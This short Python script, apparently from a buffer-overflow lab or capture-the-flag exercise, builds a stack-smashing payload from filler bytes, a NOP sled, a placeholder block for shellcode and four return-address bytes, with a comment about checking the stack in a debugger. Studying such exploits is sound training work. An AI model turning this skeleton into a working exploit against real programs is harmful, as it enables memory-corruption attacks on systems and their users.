import sys

payload = b"\x55" * (1040 - 100 - 150 - 4) + b"\x90" * 100 + b"\x44" * 150 + b"\x66" * 4

sys.stdout.buffer.write(payload)    

# after injecting the payload, use the info proc all command to check the stack size